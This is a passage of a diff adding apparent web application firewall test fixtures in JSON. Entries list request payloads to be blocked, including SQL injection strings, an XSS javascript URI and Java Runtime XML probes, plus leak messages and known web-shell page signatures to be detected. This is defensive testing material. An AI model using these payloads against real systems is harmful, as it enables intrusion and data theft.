+        "pl": 1,
+        "method": "GET",
+        "uri": "/get/bar?test=url%28javascript%3Aalert%281%29%29",
+        "body": "",
+        "action": "BLOCK"
+      }
+    ],
+    "SQLI": [
+      {
+        "rule": "942160",
+        "pl": 1,
+        "method": "GET",
+        "uri": "/BENChmARk(2999/**/999,Md5(/",
+        "body": "",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "942340",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "email='ortrue",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "942360",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qqkjq','mxTSrPILRz'),'qvxvq')-- sqCV",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "942521",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "var=Incorrectly%20constructed%20SQL%20statements%0AThis%20form%20of%20injection%20relies%20on%20the%20fact%20that%20SQL%20statements%20consist%20of%20both%20dat",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "942522",
+        "pl": 2,
+        "method": "POST",
+        "uri": "/post",
+        "body": "var=Incorrectly%20constructed%20SQL%20statements%0AThis%20form%20of%20injection%20relies%20on%20the%20fact%20that%20SQL%20statements%20consist%20of%20both%20dat",
+        "action": "BLOCK"
+      }
+    ],
+    "JAVA": [
+      {
+        "rule": "944100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "<?xml version=\"1.0\"?><xml><java.lang.Runtime attribute_name=\"attribute_value\">value</java.lang.Runtime></xml>",
+        "action": "BLOCK"
+      },
+      {
+        "rule": "944100",
+        "pl": 1,
+        "method": "POST",
+        "uri": "/post",
+        "body": "<?xml version=\"1.0\"?><xml><element java.lang.Runtime=\"attribute_value\">element_value</element></xml>",
+        "action": "BLOCK"
+      }
+    ]
+  },
+  "response_misses": {
+    "LEAK": [
+      {
+        "rule": "950020",
+        "body": ""
+      },
+      {
+        "rule": "950100",
+        "body": ""
+      },
+      {
+        "rule": "950150",
+        "body": "ViewStateException: Invalid viewstate detected."
+      },
+      {
+        "rule": "950150",
+        "body": "HttpRequestValidationException: A potentially dangerous Request.Form value was detected."
+      },
+      {
+        "rule": "950150",
+        "body": "HttpCompileException: Compilation error occurred while processing the request."
+      }
+    ],
+    "LEAK-SQL": [
+      {
+        "rule": "951110",
+        "body": "[match sql-errors.data]the used select statements have different number of columns[/match]: [Microsoft][ODBC Microsoft Access Driver] Syntax error (missing oper"
+      },
+      {
+        "rule": "951130",
+        "body": "[match sql-errors.data]the used select statements have different number of columns[/match]: DB2 SQL Error: SQLCODE=-104, SQLSTATE=42601, SQLERRMC=DECLARE"
+      },
+      {
+        "rule": "951140",
+        "body": "[match sql-errors.data]the used select statements have different number of columns[/match]: [DM_QUERY_E_SYNTAX]error:  \"A Parser Error (syntax error) has occurr"
+      },
+      {
+        "rule": "951150",
+        "body": "[match sql-errors.data]the used select statements have different number of columns[/match]: Dynamic SQL Error"
+      },
+      {
+        "rule": "951160",
+        "body": "[match sql-errors.data]the used select statements have different number of columns[/match]: SQL-status: HY000 [FrontBase Inc.][FrontBase ODBC]Semantic error 217"
+      }
+    ],
+    "LEAK-JAVA": [
+      {
+        "rule": "952110",
+        "body": "javax.servlet.ServletException: Error occurred during request processing"
+      },
+      {
+        "rule": "952110",
+        "body": "org.springframework.web.client.HttpClientErrorException: 400 Bad Request"
+      },
+      {
+        "rule": "952110",
+        "body": "org.hibernate.exception.ConstraintViolationException: could not execute statement"
+      },
+      {
+        "rule": "952110",
+        "body": "java.net.SocketTimeoutException: Read timed out"
+      },
+      {
+        "rule": "952110",
+        "body": "org.springframework.security.access.AccessDeniedException: Access is denied"
+      }
+    ],
+    "LEAK-PHP": [
+      {
+        "rule": "953100",
+        "body": "Warning: The function requested (foo) is not supported"
+      },
+      {
+        "rule": "953101",
+        "body": "Maximum allowed file size is 10 MB"
+      },
+      {
+        "rule": "953101",
+        "body": "Invalid date selected"
+      },
+      {
+        "rule": "953101",
+        "body": "This is a static function"
+      },
+      {
+        "rule": "953101",
+        "body": "cannot be empty."
+      }
+    ],
+    "LEAK-IIS": [
+      {
+        "rule": "954100",
+        "body": "C:\\inetpub \n"
+      },
+      {
+        "rule": "954100",
+        "body": "C:/inetpub \n"
+      },
+      {
+        "rule": "954100",
+        "body": "c:/inetpub \n"
+      },
+      {
+        "rule": "954101",
+        "body": "\\inetpub \n"
+      },
+      {
+        "rule": "954101",
+        "body": "/inetpub \n"
+      }
+    ],
+    "WEBSHELL": [
+      {
+        "rule": "955100",
+        "body": "<h1>.:NCC:. Shell v"
+      },
+      {
+        "rule": "955100",
+        "body": "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
+      },
+      {
+        "rule": "955100",
+        "body": "<html><head><title>-:[GreenwooD]:- WinX Shell</title></head>"
+      },
+      {
+        "rule": "955110",
+        "body": "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><title>r57 Shell Version 1.50</title></head><body></body></html>"
+      },
+      {
+        "rule": "955120",
+        "body": "<html><head><meta http-equiv='Content-Type' content='text/html; charset=UTF-8'><title>example.com - WSO 4.2.6</title>"
+      }
+    ],
+    "LEAK-RUBY": [
+      {
+        "rule": "956100",
+        "body": "SyntaxError (/path/to/your/app/controllers/reflects_controller.rb:10: syntax error, unexpected keyword_end)"
+      },
+      {
+        "rule": "956100",
+        "body": "NameError (undefined local variable or method `unexistent_variable' for #&lt;PostsController:0x00007f...>"
+      },
+      {
+        "rule": "956100",
+        "body": "ActiveRecord::RecordNotFound (Couldn't find Post with 'id'=999)"
+      },
+      {
+        "rule": "956100",
+        "body": "ActionView::Template::Error (undefined method 'name' for nil:NilClass)"
+      },
+      {
+        "rule": "956100",
+        "body": "TypeError: no implicit conversion of String into Integer"
+      }
+    ]
+  }
+}
